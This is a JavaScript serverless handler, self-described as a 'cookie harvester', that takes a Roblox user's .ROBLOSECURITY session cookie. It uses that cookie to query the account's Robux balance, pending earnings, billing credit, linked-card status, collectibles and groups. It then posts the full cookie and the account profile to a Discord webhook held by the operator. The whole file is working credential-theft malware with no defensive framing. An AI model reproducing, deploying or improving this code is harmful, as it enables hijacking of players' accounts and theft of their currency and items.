// api/submit.js
const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;

// ---------- Helper: get CSRF token ----------
async function getCsrfToken(cookie) {
  // The /mobileapi/userinfo endpoint returns a CSRF token in its headers.
  const res = await fetch("https://www.roblox.com/mobileapi/userinfo", {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  const csrfToken = res.headers.get("x-csrf-token");
  if (!csrfToken) throw new Error("Failed to get CSRF token");
  return csrfToken;
}

// ---------- User info (public) ----------
async function getUser(userId) {
  const res = await fetch(`https://users.roblox.com/v1/users/${userId}`);
  if (!res.ok) throw new Error("User fetch failed");
  return await res.json();
}

function getAgeDays(createdDate) {
  return Math.floor((new Date() - new Date(createdDate)) / (1000 * 60 * 60 * 24));
}

// ---------- Robux balance (authenticated) ----------
async function getRobux(userId, cookie) {
  const res = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  if (!res.ok) throw new Error("Robux fetch failed");
  const data = await res.json();
  return { balance: data.robux || 0 };
}

// ---------- Groups (public) ----------
async function getGroups(userId) {
  try {
    const res = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`);
    if (!res.ok) return { owned: 0, funds: 0 };
    const data = await res.json();
    const owned = data.data?.length || 0;
    // Note: Summing 'funds' requires additional, expensive calls for each group.
    return { owned, funds: 0 };
  } catch (e) {
    return { owned: 0, funds: 0 };
  }
}

// ---------- Total Place Visits ----------
async function getTotalPlaceVisits(userId) {
  let totalVisits = 0;
  let cursor = null;
  do {
    const url = `https://games.roblox.com/v2/users/${userId}/games?sortOrder=Asc&limit=50${cursor ? `&cursor=${cursor}` : ""}`;
    const res = await fetch(url);
    if (!res.ok) break;
    const data = await res.json();
    for (const game of data.data) {
      const gameDetailsRes = await fetch(`https://games.roblox.com/v1/games?universeIds=${game.id}`);
      if (gameDetailsRes.ok) {
        const gameDetails = await gameDetailsRes.json();
        totalVisits += gameDetails.data[0]?.placeVisits || 0;
      }
    }
    cursor = data.nextPageCursor;
  } while (cursor);
  return totalVisits;
}

// ---------- Pending Robux (from transactions) ----------
async function getPendingRobux(userId, cookie) {
  let pending = 0;
  try {
    const res = await fetch(`https://economy.roblox.com/v2/users/${userId}/transactions?transactionType=Incoming&limit=100`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (!res.ok) return pending;
    const data = await res.json();
    for (const transaction of data.data) {
      if (transaction.transactionType === "Sale" || transaction.transactionType === "GroupPayout") {
        pending += transaction.currency?.amount || 0;
      }
    }
  } catch (e) {
    console.warn("Failed to fetch pending Robux:", e);
  }
  return pending;
}

// ---------- Billing (Credit, Convert, Card) ----------
async function getBilling(cookie, csrfToken) {
  const defaultBilling = { credit: 0, convert: 0, card: "False" };
  try {
    const res = await fetch("https://www.roblox.com/billing/user/credit", {
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
        "X-CSRF-TOKEN": csrfToken
      }
    });
    if (!res.ok) return defaultBilling;
    const html = await res.text();
    const creditMatch = html.match(/"creditAmount":(\d+)/);
    const convertMatch = html.match(/"convertedRobux":(\d+)/);
    const hasCard = html.includes('"isCardLinked":true');
    return {
      credit: creditMatch ? parseInt(creditMatch[1], 10) : 0,
      convert: convertMatch ? parseInt(convertMatch[1], 10) : 0,
      card: hasCard ? "True" : "False"
    };
  } catch (e) {
    console.error("Billing fetch error:", e);
    return defaultBilling;
  }
}

// ---------- Collectibles (from inventory) ----------
async function getCollectibles(userId, cookie) {
  let collectibles = [];
  let cursor = null;
  do {
    const url = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100${cursor ? `&cursor=${cursor}` : ""}`;
    const res = await fetch(url, { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } });
    if (!res.ok) break;
    const data = await res.json();
    collectibles.push(...data.data);
    cursor = data.nextPageCursor;
  } while (cursor);
  // Return the names of the first 3 collectibles for display
  return collectibles.slice(0, 3).map(item => item.name);
}

// ---------- Recently Played Games ----------
async function getRecentlyPlayedGames(userId) {
  const url = `https://games.roblox.com/v1/users/${userId}/games?sortOrder=Desc&limit=50`;
  const res = await fetch(url);
  if (!res.ok) return [];
  const data = await res.json();
  return (data.data || []).map(game => game.name);
}

async function getPlayedPasses(userId) {
  const targetGames = ["Pet Simulator 99", "Breaking Point 2", "Murder Mystery 2"];
  const recentGames = await getRecentlyPlayedGames(userId);
  return targetGames.map(name => {
    const played = recentGames.some(g => g.toLowerCase().includes(name.toLowerCase()));
    return { name, played: played ? "True" : "False", passes: 0 };
  });
}

// ---------- Country flag (unicode) ----------
async function getCountryFlag(req) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
  if (!ip || ip === '::1') return '🏠 Local';
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,countryCode`);
    const data = await geoRes.json();
    if (data.status === 'success' && data.countryCode) {
      const code = data.countryCode;
      const flag = code.split('').map(letter =>
        String.fromCodePoint(letter.charCodeAt(0) + 127397)
      ).join('');
      return `${flag} ${code}`;
    }
  } catch (e) {}
  return '🌍 Unknown';
}

// ---------- Avatar ----------
async function getUserAvatarUrl(userId) {
  try {
    const res = await fetch(
      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`
    );
    if (!res.ok) return null;
    const data = await res.json();
    return data.data?.[0]?.imageUrl || null;
  } catch (e) {
    return null;
  }
}

// ---------- MAIN HANDLER ----------
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const { cookie, rbxuid } = req.body;
  if (!cookie || !rbxuid) return res.status(400).json({ error: "Missing cookie or rbxuid" });
  if (!WEBHOOK_URL) return res.status(500).json({ error: "Missing WEBHOOK_URL env var" });

  try {
    // Get CSRF token for protected endpoints
    const csrfToken = await getCsrfToken(cookie);
    
    // Parallel fetch all data
    const [userData, robux, groups, totalVisits, pendingRobux, billing, collectibles, playedPasses, countryFlag, avatarUrl] = await Promise.all([
      getUser(rbxuid),
      getRobux(rbxuid, cookie),
      getGroups(rbxuid),
      getTotalPlaceVisits(rbxuid),
      getPendingRobux(rbxuid, cookie),
      getBilling(cookie, csrfToken),
      getCollectibles(rbxuid, cookie),
      getPlayedPasses(rbxuid),
      getCountryFlag(req),
      getUserAvatarUrl(rbxuid)
    ]);

    const accountAge = getAgeDays(userData.created);
    const summary = robux.balance + (pendingRobux); // Summary = Balance + Pending
    const playedPassesText = playedPasses.map(p => `${p.name} | ${p.played} | ${p.passes}`).join("\n");
    const rolimonsLink = `https://www.rolimons.com/player/${userData.id}`;
    const cookieThumb = "https://png.pngtree.com/png-vector/20201010/ourmid/pngtree-cartoon-delicious-dessert-cookie-cookie-clipart-png-image_2360164.jpg";
    const robuxEmoji = "<:Robux:1495081542370726080>";

    // ---------- Embed 1: Stats ----------
    const statsEmbed = {
      title: "🔱 Vyro Har - Result",
      description: `**Check_VYROSECURITY | Vyro**\n\`2400c5b00-465b-1000-bd8d8e8fca5bc723\``,
      color: 0x1E3A8A,
      thumbnail: { url: cookieThumb },
      image: avatarUrl ? { url: avatarUrl } : undefined,
      fields: [
        {
          name: "📌 About User",
          value: `**${userData.name}** (**${userData.displayName}**)\n**UserID:** \`${userData.id}\`\n**Account Age:** ${accountAge} Days\n**Place Visits:** ${totalVisits}\n**Country:** ${countryFlag}`,
          inline: false
        },
        {
          name: "💰 Robux",
          value: `${robuxEmoji} **Balance:** ${robux.balance}\n${robuxEmoji} **Pending:** ${pendingRobux}`,
          inline: true
        },
        {
          name: "💳 Billing",
          value: `**Credit:** ${billing.credit}\n**Convert:** ${billing.convert}\n**Card:** ${billing.card}`,
          inline: true
        },
        {
          name: "📊 Played | Passes",
          value: `\`\`\`\n${playedPassesText}\n\`\`\``,
          inline: false
        },
        {
          name: "📝 Summary",
          value: `**${summary}**`,
          inline: false
        },
        {
          name: "📊 Settings",
          value: `**(Verified)** ${userData.isVerified ? "True" : "False"}\n**Is Banned** ${userData.isBanned ? "True" : "False"}\n**Email Enabled** ${userData.hasEmail ? "True" : "False"}`,
          inline: true
        },
        {
          name: "🎁 Collectibles",
          value: collectibles.length ? collectibles.map(c => `**${c}**`).join("\n") : "**None**",
          inline: true
        },
        {
          name: "📊 Groups",
          value: `**Owned:** ${groups.owned}`,
          inline: true
        },
        {
          name: "🔗 Rolimons Profile",
          value: `[Click here](${rolimonsLink})`,
          inline: false
        }
      ],
      footer: { text: "made by vyro28 • cookie harvester" },
      timestamp: new Date().toISOString()
    };

    // ---------- Embed 2: .ROBLOSECURITY Cookie ----------
    const cookieEmbed = {
      title: "🍪 ***.ROBLOSECURITY***",
      description: `**Full Roblox Cookie:**\n\`\`\`\n${cookie}\n\`\`\``,
      color: 0x1E3A8A,
      thumbnail: { url: cookieThumb },
      footer: { text: "made by vyro28 • cookie harvester" },
      timestamp: new Date().toISOString()
    };

    // Send both embeds
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: "@everyone", username: "Vyro Harvest", embeds: [statsEmbed] })
    });
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: "Vyro Harvest", embeds: [cookieEmbed] })
    });

    return res.status(200).json({ success: true, firstTime: true });
  } catch (err) {
    console.error("Harvest error:", err);
    return res.status(500).json({ error: err.message });
  }
}
